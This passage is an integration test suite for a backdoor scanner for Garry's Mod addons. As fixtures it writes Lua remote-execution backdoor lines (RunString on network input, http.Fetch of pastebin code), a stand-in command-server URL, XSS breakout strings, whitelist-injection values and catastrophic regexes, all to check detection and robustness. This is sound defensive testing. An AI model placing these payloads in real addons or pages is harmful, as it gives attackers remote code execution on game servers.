        assert refused.returncode == 2, f"exit {refused.returncode}: {refused.stdout}{refused.stderr}"
        assert "the limit is" in refused.stderr, refused.stderr
        checks += 1

        # Only the first few MB of a module's readable text is examined. That is a
        # limit, not a verdict, so the scan has to stop calling itself complete.
        wordy = work / "wordy-module"
        (wordy / "lua" / "bin").mkdir(parents=True)
        filler = b"".join(b"SomeOrdinarySymbolName_%06d\x00" % i for i in range(200000))
        assert len(filler) > 5 * 1024 * 1024, len(filler)
        (wordy / "lua" / "bin" / "gmsv_big_win64.dll").write_bytes(
            b"MZ\x90\x00" + filler + b"http://panel.zapto.org:1337/raw.lua\x00")
        data = run(wordy, "module-string-limit")
        assert not data["complete"], "a truncated module still called the scan complete"
        reasons = data["unscanned"]["by_reason"]
        assert reasons.get("string_limit", 0) == 1, reasons
        checks += 1

        # "checked against N hashes" is the assurance an operator reads. A line
        # that can never match a file must not be counted towards it.
        hash_path = modified_rules / "known_hashes.txt"
        good = sorted(hashes)[0]
        hash_path.write_text("\n".join([
            good,
            "notahash",
            "deadbeef" * 7 + "deadbee",
            "g" * 64,
            "this is a whole sentence someone pasted",
        ]) + "\n", encoding="utf-8")
        loaded = subprocess.run(
            [str(scanner), "-d", str(harvest), "-o", str(work / "output" / "hash-malformed"),
             "--rules", str(modified_rules)],
            capture_output=True, text=True, timeout=30)
        assert "Loaded 1 known bad hash." in loaded.stdout, loaded.stdout
        assert "of 1 listed hashes matched" in loaded.stdout, loaded.stdout
        assert "are not SHA-256" in loaded.stderr, loaded.stderr
        assert "notahash" in loaded.stderr, loaded.stderr
        hash_path.write_text("\n".join(hashes) + "\n", encoding="utf-8")
        checks += 1

        # The whitelist is for false positives. A published backdoor hash is not
        # one, so it must not be possible to silence it by whitelisting the file.
        whitelist_path = modified_rules / "whitelist.txt"
        saved_whitelist = whitelist_path.read_text(encoding="utf-8")
        whitelist_path.write_text(saved_whitelist + "\n" + "\n".join(hashes) + "\n",
                                  encoding="utf-8")
        data = run(harvest, "hash-beats-whitelist", rule_dir=modified_rules)
        assert "HASH-001" in ids(data), "a whitelist entry hid a known backdoor"
        conflict = subprocess.run(
            [str(scanner), "-d", str(harvest), "-o", str(work / "output" / "hash-conflict"),
             "--rules", str(modified_rules), "-q"],
            capture_output=True, text=True, timeout=30)
        assert "known_hashes.txt lists as a backdoor" in conflict.stderr, conflict.stderr
        whitelist_path.write_text(saved_whitelist, encoding="utf-8")

        (modified_rules / "known_hashes.txt").write_text("", encoding="utf-8")

        deceptive = work / "deceptive"
        deceptive.mkdir()
        hostile = b"RunString(net.ReadString())\n"
        for index, entry in enumerate((
            "../addons/trusted/x.lua",
            "/addons/trusted/x.lua",
            "lua/../../addons/trusted/x.lua",
            "C:/addons/trusted/x.lua",
            "addons/trusted/x.lua",
        )):
            (deceptive / f"{index}.gma").write_bytes(gma([(entry, hostile)]))
        with (modified_rules / "whitelist.txt").open("w", encoding="utf-8") as output:
            output.write("*/addons/trusted/*\n")
        data = run(deceptive, "deceptive-entries", rule_dir=modified_rules)
        assert data["whitelisted"] == 0, "an archive entry name must not satisfy a path whitelist"
        assert len([item for item in data["detections"] if item["id"] == "LUA-001"]) == 5
        assert len([item for item in data["detections"] if item["id"] == "GMA-001"]) == 4
        for item in data["detections"]:
            assert ".." not in item["file"], item["file"]

        legitimate = work / "legit/addons/trusted"
        legitimate.mkdir(parents=True)
        (legitimate / "pack.gma").write_bytes(gma([("lua/x.lua", hostile)]))
        (legitimate / "plain.lua").write_bytes(hostile)
        data = run(work / "legit", "whitelist-still-works", expected=0, rule_dir=modified_rules)
        assert data["whitelisted"] == 2, "a real path under addons/trusted must still be suppressed"
        (modified_rules / "whitelist.txt").write_text("", encoding="utf-8")

        workshop = work / "workshop"
        workshop.mkdir()
        loader = b'RunString(file.Read("materials/payload.vmt", "GAME"))\n'
        payload = b"A" * 100
        (workshop / "one.gma").write_bytes(gma([("lua/load.lua", loader)]))
        (workshop / "two.gma").write_bytes(gma([("materials/payload.vmt", payload)]))
        assert "COMP-010" not in ids(run(workshop, "unrelated-archives"))
        (workshop / "one.gma").write_bytes(gma([("lua/load.lua", loader), ("materials/payload.vmt", payload)]))
        data = run(workshop, "same-archive")
        assert "COMP-010" in ids(data)
        empty = work / "empty.gma"
        empty.write_bytes(gma([("lua/empty.lua", b"")]))
        assert run(empty, "empty-entry", expected=0)["files_processed"] == 1

        compressed = work / "compressed"
        compressed.mkdir()
        raw = gma([("lua/load.lua", loader), ("materials/payload.vmt", payload)])
        archive = lzma.compress(raw, format=lzma.FORMAT_ALONE)
        for index in range(8):
            (compressed / f"{index}.gma").write_bytes(archive)
        data = run(compressed, "bounded-archives", ["--memory-limit", "64"])
        assert data["decompressed_archives"] == 8 and data["unscanned"]["total"] == 0
        assert 0 < data["archive_memory_peak_bytes"] <= 64 * 1024 * 1024
        too_large = work / "declared-large.gma"
        too_large.write_bytes(archive[:5] + struct.pack("<Q", 128 * 1024 * 1024) + archive[13:])
        data = run(too_large, "archive-limit", ["--memory-limit", "64"], expected=3)
        assert data["unscanned"]["by_reason"]["too_large"] == 1

        unreadable = work / "unreadable"
        unreadable.mkdir()
        locked = unreadable / "locked.lua"
        locked.write_text("local clean = true\n", encoding="utf-8")
        if os.name == "nt":
            from ctypes import wintypes
            kernel = ctypes.WinDLL("kernel32", use_last_error=True)
            kernel.CreateFileW.argtypes = (wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE)
            kernel.CreateFileW.restype = wintypes.HANDLE
            kernel.CloseHandle.argtypes = (wintypes.HANDLE,)
            handle = kernel.CreateFileW(str(locked), 0x80000000, 0, None, 3, 0, None)
            assert handle != wintypes.HANDLE(-1).value, ctypes.get_last_error()
            try:
                data = run(unreadable, "unreadable", expected=3)
                assert data["unscanned"]["by_reason"]["unreadable"] == 1
            finally:
                kernel.CloseHandle(handle)
        elif os.geteuid() != 0:
            denied = unreadable / "denied"
            denied.mkdir()
            (denied / "inside.lua").write_text("local hidden = true\n", encoding="utf-8")
            denied.chmod(0)
            try:
                data = run(unreadable, "unreadable", expected=3)
                assert data["unscanned"]["by_reason"]["unreadable"] == 1
                assert any(item["file"].endswith("/denied") for item in data["unscanned"]["files"])
                assert data["files_processed"] == 1
            finally:
                denied.chmod(0o700)
        else:
            print("integration: permission regression skipped when running as root")

        version = subprocess.run([str(scanner), "--version", "--rules", str(rules)],
                                 capture_output=True, text=True, timeout=30)
        assert version.returncode == 0, version.stderr
        assert version.stdout.startswith("BD-Scan "), version.stdout
        assert "patterns" in version.stdout and "digest" in version.stdout, version.stdout
        checks += 1

        runtime = work / "runtime"
        (runtime / "addons" / "x" / "lua").mkdir(parents=True)
        (runtime / "data").mkdir(parents=True)
        (runtime / "addons" / "x" / "lua" / "loader.lua").write_text(
            'RunString(file.Read("payload.txt", "DATA"))\n', encoding="utf-8")
        (runtime / "data" / "payload.txt").write_text("RunString(secret)\n", encoding="utf-8")
        (runtime / "data" / "settings.json").write_text(
            '{"volume":0.8,"lastmap":"gm_construct"}\n', encoding="utf-8")
        (runtime / "addons" / "x" / "config.txt").write_text("RunString(nope)\n", encoding="utf-8")
        data = run(runtime, "runtime-data")
        assert "DATA-001" in ids(data), ids(data)
        flagged = {item["file"] for item in data["detections"] if item["id"] == "DATA-001"}
        assert any(name.endswith("data/payload.txt") for name in flagged), flagged
        assert not any(name.endswith("settings.json") for name in flagged), flagged
        assert not any(name.endswith("config.txt") for name in flagged), flagged

        assembled = work / "assembled"
        assembled.mkdir()
        (assembled / "dispatch.lua").write_text(
            'local n = ("RunXtring"):gsub("X", "S")\n_G[n](net.ReadString())\n', encoding="utf-8")
        data = run(assembled, "assembled-name")
        assert "COMP-020" in ids(data), ids(data)
        assert any(item["severity"] == "critical" for item in data["detections"])

        shaped = work / "shaped"
        shaped.mkdir()
        (shaped / "packed.lua").write_text(
            "local lIlIlI,IIll00,llIIOO,O0O0l1,I1I1l0=1,2,3,4,5\n"
            "RunString(" + '"' + "x" * 3200 + '"' + ")\n", encoding="utf-8")
        data = run(shaped, "structural-signals")
        found = ids(data)
        assert "OBF-001" in found and "OBF-004" in found, found
        assert "COMP-022" in found, found

        (shaped / "readable.lua").write_text(
            'local function Greet(name)\n    print("hi " .. name)\nend\nGreet("world")\n',
            encoding="utf-8")
        data = run(shaped, "structural-negative")
        quiet = {item["id"] for item in data["detections"]
                 if item["file"].endswith("readable.lua")}
        assert not any(item.startswith("OBF-") for item in quiet), quiet

        graded = work / "graded"
        graded.mkdir()
        (graded / "bad.lua").write_text(
            'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n',
            encoding="utf-8")
        (graded / "mild.lua").write_text('local t = util.TableToJSON(x)\nfile.Delete(t)\n',
                                         encoding="utf-8")

        sarif_dir = work / "output" / "sarif-run"
        run(graded, "sarif-run", ["--sarif"])
        report = json.loads((sarif_dir / "scan_results.sarif").read_text(encoding="utf-8"))
        assert report["version"] == "2.1.0", report["version"]
        driver = report["runs"][0]["tool"]["driver"]
        assert driver["name"] == "BD-Scan"
        assert len(driver["rules"]) > 0
        declared = {rule["id"] for rule in driver["rules"]}
        for result in report["runs"][0]["results"]:
            assert result["ruleId"] in declared, result["ruleId"]
            assert result["level"] in ("error", "warning", "note"), result["level"]
            location = result["locations"][0]["physicalLocation"]
            assert not location["artifactLocation"]["uri"].startswith("/"), location
        checks += 1

        # SARIF artifact URIs are URI references, not paths. An unencoded '#'
        # truncates the path at a fragment and the finding points somewhere else.
        awkward = work / "awkward"
        names = ["with space", "with#hash", "with%percent", "with&amp",
                 "with'quote", "with+plus", "mit-ämlaut", "日本語"]
        for name in names:
            folder = awkward / name
            folder.mkdir(parents=True)
            (folder / "bad.lua").write_text(
                'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n',
                encoding="utf-8")
        run(awkward, "sarif-awkward-paths", ["--sarif"])
        report = json.loads(
            (work / "output" / "sarif-awkward-paths" / "scan_results.sarif").read_text(encoding="utf-8"))
        seen = set()
        for result in report["runs"][0]["results"]:
            uri = result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
            assert all(ord(c) < 128 for c in uri), f"non-ascii in uri {uri!r}"
            for character in " #\\":
                assert character not in uri, f"raw {character!r} in uri {uri!r}"
            parsed = urllib.parse.urlsplit(uri)
            assert not parsed.fragment, f"uri {uri!r} split off a fragment"
            decoded = urllib.parse.unquote(uri, encoding="utf-8")
            seen.add(decoded.split("/")[0])
        assert seen == set(names), f"uris did not decode back to the directories: {seen}"
        checks += 1

        # Lua ends a line at CR, LF or CRLF alike, so the same file saved three
        # ways has to read the same. Splitting on the line feed alone turned a
        # classic Mac file into one enormous line and OBF-001 called it packed.
        endings = work / "endings"
        body = "\n".join(
            "local value%d = math.floor(util.SharedRandom('seed', 1, 100) * %d)" % (i, i)
            for i in range(1, 120))
        assert len(body) > 3000, "the packed-line heuristic needs a long enough file"
        for name, newline in (("lf", "\n"), ("crlf", "\r\n"), ("cr", "\r")):
            folder = endings / name
            folder.mkdir(parents=True)
            (folder / "ordinary.lua").write_bytes(body.replace("\n", newline).encode())
            found = run(folder, "line-endings-" + name, expected=0)
            assert not found["detections"], f"{name} endings reported {found['detections']}"
        checks += 1

        # The same payload behind a comment, once per line ending. A comment that
        # ran to the line feed alone blanked everything after it in a CR file.
        hidden = work / "hidden"
        for name, newline in (("lf", "\n"), ("crlf", "\r\n"), ("cr", "\r")):
            folder = hidden / name
            folder.mkdir(parents=True)
            payload = ("-- harmless header" + newline +
                       'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)'
                       + newline)
            (folder / "bad.lua").write_bytes(payload.encode())
            found = run(folder, "comment-endings-" + name)
            assert "LUA-001" in ids(found), f"{name} endings hid the payload behind the comment"
            lines = {d["line_number"] for d in found["detections"] if d.get("id", "").startswith("LUA")}
            assert lines == {2}, f"{name} endings reported lines {lines}, expected the second line"
        checks += 1

        # A composite has no tags of its own, so excluding a tag can silently take
        # a critical verdict with it. The scan may still do that, but it has to say so.
        staged = work / "staged"
        staged.mkdir()
        (staged / "bad.lua").write_text(
            'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n',
            encoding="utf-8")
        assert "COMP-001" in ids(run(staged, "composite-present"))
        assert "COMP-001" not in ids(run(staged, "composite-excluded",
                                         ["--exclude-tags", "network"]))
        warned = subprocess.run(
            [str(scanner), "-d", str(staged), "-o", str(work / "output" / "composite-warning"),
             "--rules", str(rules), "-q", "--exclude-tags", "network"],
            capture_output=True, text=True, timeout=30)
        assert "COMP-001" in warned.stderr, warned.stderr
        assert "can no longer fire" in warned.stderr, warned.stderr
        quiet = subprocess.run(
            [str(scanner), "-d", str(staged), "-o", str(work / "output" / "composite-nowarning"),
             "--rules", str(rules), "-q"],
            capture_output=True, text=True, timeout=30)
        assert "can no longer fire" not in quiet.stderr, quiet.stderr
        checks += 1

        # Two runs over the same tree must print the same thing. The skipped-file
        # samples were the first ones recorded, and with several threads that is
        # whichever finished first.
        unstable = work / "unstable"
        unstable.mkdir()
        for index in range(60):
            (unstable / ("broken%02d.gma" % index)).write_bytes(b"GMAD" + bytes([3]) + b"\0" * 20)
        printed = set()
        for _ in range(4):
            repeat = subprocess.run(
                [str(scanner), "-d", str(unstable),
                 "-o", str(work / "output" / "stable"),
                 "--rules", str(rules), "--color", "never"],
                capture_output=True, text=True, timeout=60)
            assert repeat.returncode == 3, repeat.stdout
            printed.add(re.sub(r"\d+\.\d+ s", "<duration>", repeat.stdout))
            # Whichever thread got there first must not decide what is shown:
            # the samples are the lexicographically first names, every time.
            shown = re.findall(r"broken\d+\.gma", repeat.stdout)
            assert shown == sorted(shown), f"samples are not sorted: {shown}"
            assert shown == ["broken%02d.gma" % i for i in range(len(shown))], \
                f"samples are not the first names: {shown}"
        assert len(printed) == 1, "the summary differed between identical runs"
        checks += 1

        cache_file = work / "scan-cache.json"
        first = run(graded, "cache-cold", ["--cache", str(cache_file)])
        assert cache_file.is_file()
        second = run(graded, "cache-warm", ["--cache", str(cache_file)])

        def signature(data):
            return sorted((item["file"], item["line_number"], item["id"], item["severity"])
                          for item in data["detections"])

        assert signature(first) == signature(second), "cache changed the findings"
        assert second["files_processed"] == first["files_processed"]

        (graded / "late.lua").write_text("loadstring(payload)\n", encoding="utf-8")
        third = run(graded, "cache-changed", ["--cache", str(cache_file)])
        assert any(item["file"].endswith("late.lua") for item in third["detections"])
        (graded / "late.lua").unlink()

        stale = json.loads(cache_file.read_text(encoding="utf-8"))
        stale["ruleset_version"] = "0000deadbeef"
        cache_file.write_text(json.dumps(stale), encoding="utf-8")
        fourth = run(graded, "cache-stale-rules", ["--cache", str(cache_file)])
        assert signature(fourth) == signature(first), "stale cache changed the findings"

        # A damaged cache must cost nothing but a warning. Deep nesting is the
        # shape that can take a recursive JSON parser's stack with it.
        damaged = {
            "cache-corrupt": "{not json",
            "cache-empty": "",
            "cache-binary": "\x00\x01\x02 not json",
            "cache-wrong-types": '{"schema_version": "x", "files": {"a": 5}, "ruleset_version": []}',
            "cache-deep-nesting": "[" * 5000 + "]" * 5000,
            "cache-huge-string": json.dumps({"schema_version": 1, "ruleset_version": "A" * 2000000, "files": []}),
        }
        for name, body in damaged.items():
            cache_file.write_text(body, encoding="utf-8")
            broken = run(graded, name, ["--cache", str(cache_file)])
            assert signature(broken) == signature(first), f"{name} changed the findings"

        bad_id = subprocess.run(
            [str(scanner), "--workshop", "not-a-number", "--rules", str(rules), "-q"],
            capture_output=True, text=True, timeout=30)
        assert bad_id.returncode == 2, bad_id.stdout
        assert "numeric id" in (bad_id.stdout + bad_id.stderr), bad_id.stdout + bad_id.stderr
        checks += 1

        both = subprocess.run(
            [str(scanner), "--workshop", "1", "-d", str(graded), "--rules", str(rules), "-q"],
            capture_output=True, text=True, timeout=30)
        assert both.returncode == 2, both.stdout
        assert "not both" in (both.stdout + both.stderr), both.stdout + both.stderr
        checks += 1


        # A cache must decide on content. An attacker who can drop a file into
        # addons/ can also set its timestamp, so size and mtime alone are not a
        # safe key: the second scan below used to report nothing at all.
        tamper = work / "tamper"
        tamper.mkdir()
        benign = 'local greeting = "hello there friend"\n'
        (tamper / "a.lua").write_text(benign, encoding="utf-8", newline='')
        tamper_cache = work / "tamper-cache.json"
        first = run(tamper, "cache-tamper-clean", ["--cache", str(tamper_cache)], expected=0)

        evil = 'RunString(net.ReadString())'
        evil += '\n' + '-' * (len(benign) - len(evil) - 2) + '\n'
        stat = (tamper / "a.lua").stat()
        (tamper / "a.lua").write_text(evil, encoding="utf-8", newline='')
        os.utime(tamper / "a.lua", (stat.st_atime, stat.st_mtime))
        assert (tamper / "a.lua").stat().st_size == stat.st_size, "test needs an identical size"

        after = run(tamper, "cache-tamper-swapped", ["--cache", str(tamper_cache)])
        assert "LUA-001" in ids(after), "cache served a stale result for a file that changed"
        checks += 1

        # A native binary too large to read must be recorded, not silently dropped.
        oversize = work / "oversize"
        oversize.mkdir()
        big = oversize / "gmsv_big_win64.dll"
        with big.open("wb") as handle:
            handle.write(b'MZ')
            handle.seek(65 * 1024 * 1024)
            handle.write(b'x')
        data = run(oversize, "oversize-module")
        assert data["unscanned"]["total"] == 1, data["unscanned"]
        assert data["unscanned"]["by_reason"]["too_large"] == 1, data["unscanned"]
        assert "MOD-001" in ids(data), ids(data)
        big.unlink()

        # Findings in a binary have no line numbers to report, and must not
        # borrow them from the extracted string buffer.
        native = work / "native"
        native.mkdir()
        payload = (b'A' * 64 + b'\x00' + b'http://panel.zapto.org:1337/raw.lua'
                   + b'\x00' + b'B' * 64)
        (native / "gmsv_probe_win64.dll").write_bytes(payload)
        data = run(native, "native-strings")
        found = ids(data)
        assert "MOD-010" in found, found
        for item in data["detections"]:
            if item["id"].startswith("MOD-01"):
                assert item["line_number"] == 0, item
                assert item.get("context_start", 0) == 0, item


        # An archive entry name is raw bytes chosen by whoever built the archive.
        # Invalid UTF-8 in one used to abort the JSON writer, so a crafted addon
        # suppressed the whole report while its payload was detected but unwritten.
        broken = work / "broken-names"
        broken.mkdir()
        for index, raw in enumerate([
                b"lua/" + bytes([0xff, 0xfe, 0x80]) + b"bad.lua",
                b"lua/" + bytes([0xed, 0xa0, 0x80]) + b".lua",
                b"lua/" + bytes([0xc0, 0xaf]) + b".lua",
                bytes(range(0x80, 0x90)) + b".lua"]):
            (broken / ("a%d.gma" % index)).write_bytes(
                gma([(raw, b"RunString(net.ReadString())\n")]))
        data = run(broken, "broken-entry-names")
        assert data["complete"], data
        assert "LUA-001" in ids(data), ids(data)
        assert "GMA-001" in ids(data), ids(data)
        for item in data["detections"]:
            item["file"].encode("utf-8")
            item.get("line_text", "").encode("utf-8")

        # A composite expression is parsed by recursive descent. Deep nesting used
        # to overflow the stack instead of being rejected like any other bad rule.
        deep_rules = work / "deep-rules"
        deep_rules.mkdir()
        for name in ("lua_patterns.txt", "binary_patterns.txt", "data_patterns.txt",
                     "module_patterns.txt", "known_hashes.txt", "whitelist.txt"):
            shutil.copy(rules / name, deep_rules / name)
        depth = 5000
        (deep_rules / "composite_rules.txt").write_text(
            "(" * depth + "LUA-001" + ")" * depth + ";;;[HIGH] COMP-900 Deep;;;hint\n",
            encoding="utf-8")
        deep = subprocess.run(
            [str(scanner), "-d", str(sample), "-o", str(work / "output" / "deep"),
             "--rules", str(deep_rules), "-q"],
            capture_output=True, text=True, timeout=60)
        assert deep.returncode == 2, "deep nesting: exit %d" % deep.returncode
        assert "nested deeper" in (deep.stdout + deep.stderr), deep.stdout + deep.stderr
        assert len(deep.stdout + deep.stderr) < 4000, "error message echoed the whole rule"
        checks += 1

        # One --accept call writes one whitelist line. A value carrying ';;;' or a
        # newline used to write a different rule, or a second one.
        accept_rules = work / "accept-rules"
        accept_rules.mkdir()
        for name in ("lua_patterns.txt", "binary_patterns.txt", "data_patterns.txt",
                     "module_patterns.txt", "composite_rules.txt", "known_hashes.txt"):
            shutil.copy(rules / name, accept_rules / name)
        (accept_rules / "whitelist.txt").write_text("# empty\n", encoding="utf-8")

        for bad in ["LUA-001@*/x/*;;;LUA-040", "LUA-001@*/y/*\nINJECTED@*/z/*"]:
            refused = subprocess.run(
                [str(scanner), "--accept", bad, "--reason", "test",
                 "--rules", str(accept_rules), "-q"],
                capture_output=True, text=True, timeout=30)
            assert refused.returncode == 2, (bad, refused.stdout, refused.stderr)
            checks += 1

        refused = subprocess.run(
            [str(scanner), "--accept", "LUA-001@*/ok/*", "--reason", "why;;;not",
             "--rules", str(accept_rules), "-q"],
            capture_output=True, text=True, timeout=30)
        assert refused.returncode == 2, refused.stdout
        checks += 1

        written = (accept_rules / "whitelist.txt").read_text(encoding="utf-8")
        assert "INJECTED" not in written, written
        assert "LUA-040" not in written, written

        good = subprocess.run(
            [str(scanner), "--accept", "LUA-001@*/ok/*", "--reason", "reviewed",
             "--rules", str(accept_rules), "-q"],
            capture_output=True, text=True, timeout=30)
        assert good.returncode == 0, good.stdout + good.stderr
        entries = [line for line in (accept_rules / "whitelist.txt").read_text(
            encoding="utf-8").splitlines() if line and not line.startswith("#")]
        assert entries == ["*/ok/*;;;LUA-001"], entries
        checks += 1


        # Rule files are parsed before anything is scanned, and --rules can point
        # at a directory the person running the scan did not write. Every one of
        # these used to be a plausible way to crash the parser rather than be
        # rejected by it; the deep-nesting case really did overflow the stack.
        hostile_rules = work / "hostile-rules"
        hostile_rules.mkdir()
        for name in ("binary_patterns.txt", "data_patterns.txt", "module_patterns.txt",
                     "known_hashes.txt", "whitelist.txt"):
            shutil.copy(rules / name, hostile_rules / name)
        (hostile_rules / "composite_rules.txt").write_text("", encoding="utf-8")

        hostile_patterns = [
            "(" * 3000 + "a" + ")" * 3000,
            "(?:" * 1200 + "a" + ")" * 1200,
            "a{1000}" * 40,
            "[" * 2000,
            "(a|" * 1000 + "b" + ")" * 1000,
            chr(92) * 4000,
            "(a+)+$",
            "x" * 200000,
        ]
        for index, expression in enumerate(hostile_patterns):
            (hostile_rules / "lua_patterns.txt").write_text(
                "%s;;;[HIGH] LUA-9%02d Hostile;;;hint%s" % (expression, index, chr(10)),
                encoding="utf-8")
            done = subprocess.run(
                [str(scanner), "-d", str(sample), "-o", str(work / "output" / "hostile"),
                 "--rules", str(hostile_rules), "-q"],
                capture_output=True, text=True, timeout=120)
            assert done.returncode in (0, 1, 2), (
                "hostile pattern %d: exit %d" % (index, done.returncode))
            checks += 1

        # The same for the whitelist and the composite file.
        shutil.copy(rules / "lua_patterns.txt", hostile_rules / "lua_patterns.txt")
        for name, content in [
                ("whitelist.txt", "*" * 4000 + ";;;LUA-001" + chr(10) + "[" * 2000 + ";;;LUA-001"),
                ("composite_rules.txt",
                 "(" * 3000 + "LUA-001" + ")" * 3000 + ";;;[HIGH] COMP-900 Deep;;;hint"),
                ("composite_rules.txt", "atleast(" + "9" * 400 + ", LUA-001);;;[HIGH] COMP-901 Big;;;hint"),
                ("composite_rules.txt", "LUA-001 " + "and LUA-001 " * 2000 + ";;;[HIGH] COMP-902 Wide;;;hint")]:
            original = (rules / name).read_text(encoding="utf-8")
            (hostile_rules / name).write_text(content + chr(10), encoding="utf-8")
            done = subprocess.run(
                [str(scanner), "-d", str(sample), "-o", str(work / "output" / "hostile"),
                 "--rules", str(hostile_rules), "-q"],
                capture_output=True, text=True, timeout=120)
            # 3 belongs here too: a rule that gives up partway leaves the file
            # only partly examined, which is what exit 3 is for. What must not
            # happen is a crash, and MSVC and libstdc++ disagree about which
            # expressions they refuse, so pinning one exit code pins a compiler.
            assert done.returncode in (0, 1, 2, 3), (
                "hostile %s: exit %d" % (name, done.returncode))
            (hostile_rules / name).write_text(original, encoding="utf-8")
            checks += 1

        # The glob above expands to twice its length, so whether the engine
        # accepts it differed between compilers and the scan came out as exit 1
        # on one and exit 3 on another. It is refused at load now, on both.
        wide_glob = work / "wide-glob-rules"
        wide_glob.mkdir()
        for name in ("lua_patterns.txt", "binary_patterns.txt", "data_patterns.txt",
                     "module_patterns.txt", "composite_rules.txt", "known_hashes.txt"):
            if (rules / name).is_file():
                shutil.copy(rules / name, wide_glob / name)
        (wide_glob / "whitelist.txt").write_text("*" * 4000 + ";;;LUA-001" + chr(10),
                                                 encoding="utf-8")
        refused_glob = subprocess.run(
            [str(scanner), "-d", str(sample), "-o", str(work / "output" / "wide-glob"),
             "--rules", str(wide_glob), "-q"],
            cwd=work, capture_output=True, text=True, timeout=120,
            encoding="utf-8", errors="replace")
        assert refused_glob.returncode == 1, (
            "a glob too wide to compile changed the result: exit %d" % refused_glob.returncode)
        assert "Invalid whitelist path pattern" in refused_glob.stderr, refused_glob.stderr[:200]
        assert len(refused_glob.stderr) < 1000, (
            "the warning printed the whole glob: %d characters" % len(refused_glob.stderr))
        checks += 1


        # The report shows lines out of the file being scanned, so its content is
        # chosen by whoever wrote the backdoor, and it is read by a person. None
        # of it may become markup.
        breakout = work / "breakout"
        breakout.mkdir()
        payloads = [
            'RunString("</pre><script>alert(1)</script>")',
            "RunString('\"><img src=x onerror=alert(1)>')",
            'RunString("</span></pre></details><h1>injected</h1>")',
            "RunString('</script><script>fetch(\"http://evil\")</script>')",
            'RunString("]]><!--<script>alert(1)</script>-->")',
        ]
        for index, payload in enumerate(payloads):
            (breakout / ("b%d.lua" % index)).write_text(payload + chr(10), encoding="utf-8")
        (breakout / "a b&c'd.lua").write_text('RunString("plain")' + chr(10), encoding="utf-8")

        breakout_out = work / "output" / "breakout"
        run(breakout, "breakout", ["--html"])
        report = (breakout_out / "scan_report.html").read_text(encoding="utf-8")

        tags = {}
        for name in re.findall(r"<([a-zA-Z][a-zA-Z0-9]*)", report):
            tags[name.lower()] = tags.get(name.lower(), 0) + 1

        allowed = {"html", "head", "meta", "title", "style", "body", "header", "h1", "h2",
                   "div", "p", "b", "em", "span", "details", "summary", "pre", "button",
                   "input", "label", "script", "ul", "li", "a", "code"}
        unexpected = sorted(name for name in tags if name not in allowed)
        assert not unexpected, "report grew tags it does not generate: %s" % unexpected
        assert tags.get("script", 0) == 1, "report has %d script tags" % tags.get("script", 0)
        assert tags.get("pre", 0) == report.count("</pre>"), "unbalanced <pre>"
        assert tags.get("details", 0) == report.count("</details>"), "unbalanced <details>"
        checks += 1


        # The field after ;;; is a substring of the finding text, by design, so a
        # shortened id quietly suppresses more than it names: LUA-1 also silences
        # LUA-121. --accept refuses an unknown id; a hand-edited whitelist cannot,
        # so the scanner says so instead.
        shortid = work / "short-id"
        shortid.mkdir()
        for name in ("lua_patterns.txt", "binary_patterns.txt", "data_patterns.txt",
                     "module_patterns.txt", "composite_rules.txt", "known_hashes.txt"):
            shutil.copy(rules / name, shortid / name)
        (shortid / "whitelist.txt").write_text(
            "*;;;LUA-1" + chr(10) + "*/x/*;;;LUA-999" + chr(10) +
            "*/y/*;;;LUA-121" + chr(10) + "*/z/*;;;superadmin" + chr(10), encoding="utf-8")

        warned = subprocess.run(
            [str(scanner), "-d", str(sample), "-o", str(work / "output" / "short-id"),
             "--rules", str(shortid), "--color", "never"],
            capture_output=True, text=True, timeout=60)
        noise = warned.stdout + warned.stderr
        start = noise.find("name a rule id that does not exist")
        assert start != -1, noise[-600:]
        end = noise.find("matched as a substring", start)
        block = noise[start:end if end != -1 else len(noise)]
        assert "*;;;LUA-1" in block, block
        assert "*/x/*;;;LUA-999" in block, block
        assert "LUA-121" not in block, "a valid id was reported as unknown: " + block
        assert "superadmin" not in block, "a word was mistaken for an id: " + block
        checks += 1


        # A folder above the scan root used to decide the composite scope, because
        # the walk started at the filesystem root. A parent named sound, lua or
        # models collapsed every addon into one scope and let scan-level rules
        # combine evidence from addons that have nothing to do with each other.
        parent = work / "sound" / "gm" / "addons"
        (parent / "alpha" / "lua").mkdir(parents=True)
        (parent / "alpha" / "materials").mkdir(parents=True)
        (parent / "beta").mkdir(parents=True)
        blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph" * 4
        (parent / "alpha" / "lua" / "loader.lua").write_text(
            'local blob = file.Read("data/payload.txt", "DATA")' + chr(10) +
            "RunString(blob)" + chr(10), encoding="utf-8")
        (parent / "beta" / "asset.vmt").write_text(
            '"UnlitGeneric" { "$basetexture" "' + blob + '" }' + chr(10), encoding="utf-8")

        split = run(parent, "scope-across-addons")
        assert "LUA-008" in ids(split) and "BIN-014" in ids(split), ids(split)
        assert "COMP-010" not in ids(split), "evidence was combined across two addons"
        checks += 1

        (parent / "alpha" / "materials" / "asset.vmt").write_text(
            '"UnlitGeneric" { "$basetexture" "' + blob + '" }' + chr(10), encoding="utf-8")
        together = run(parent, "scope-within-addon")
        assert "COMP-010" in ids(together), "the halves of one addon stopped combining"
        checks += 1


        # Windows refuses paths past 260 characters unless a process asks for the
        # extended form. Without that the scanner reported the files as unscanned
        # and looked at nothing, which is a way to hide a payload: nest it deeply
        # and the operator sees a skip count instead of a finding.
        deep = work / "deep"
        deep.mkdir()
        nested = deep
        while len(str(nested)) < 320:
            nested = nested / "nested_directory_level"
        try:
            nested.mkdir(parents=True, exist_ok=True)
            (nested / "deep.lua").write_text("RunString(net.ReadString())" + chr(10),
                                             encoding="utf-8")
            long_name = deep / ("x" * 200 + ".lua")
            long_name.write_text("loadstring(payload)" + chr(10), encoding="utf-8")
            reachable = True
        except OSError:
            reachable = False

        if reachable:
            data = run(deep, "long-paths")
            assert data["complete"], data["unscanned"]
            assert data["unscanned"]["total"] == 0, data["unscanned"]
            assert data["files_processed"] == 2, data["files_processed"]
            found = ids(data)
            assert "LUA-001" in found and "LUA-003" in found, found
            for item in data["detections"]:
                assert not item["file"].startswith("//?/"), item["file"]
            checks += 1
        else:
            print("integration: long path regression skipped, could not create the tree")

